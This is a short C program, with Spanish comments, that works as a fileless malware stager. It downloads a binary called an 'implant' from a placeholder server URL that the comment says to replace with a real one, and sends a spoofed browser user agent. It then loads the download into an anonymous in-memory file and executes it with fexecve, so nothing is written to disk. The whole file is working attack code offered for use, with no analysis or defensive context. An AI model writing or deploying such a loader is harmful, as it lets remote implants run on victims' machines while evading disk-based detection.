#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <curl/curl.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001
#endif

#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif

int memfd_create(const char *name, unsigned int flags) {
    return syscall(SYS_memfd_create, name, flags);
}

// Buffer para almacenar lo descargado
struct MemoryBuffer {
    char *data;
    size_t size;
};

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryBuffer *mem = (struct MemoryBuffer *)userp;

    char *ptr = realloc(mem->data, mem->size + realsize);
    if (ptr == NULL) {
        return 0; // out of memory
    }

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;

    return realsize;
}

int main() {
    const char *url = "http://tu-servidor.com/implante";  // 🔁 Cambiá por tu URL real

    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "curl init failed\n");
        return 1;
    }

    struct MemoryBuffer buffer = {0};

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&buffer);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK || buffer.size == 0) {
        fprintf(stderr, "curl failed: %s\n", curl_easy_strerror(res));
        return 1;
    }
    curl_easy_cleanup(curl);

    int fd = memfd_create("payload", MFD_CLOEXEC);
    if (fd < 0) {
        perror("memfd_create");
        return 1;
    }

    if (write(fd, buffer.data, buffer.size) != buffer.size) {
        perror("write");
        return 1;
    }

    free(buffer.data);
    lseek(fd, 0, SEEK_SET);

    char *const argv[] = {"payload", NULL};
    char *const envp[] = {NULL};
    fexecve(fd, argv, envp);

    perror("fexecve");
    return 1;
}
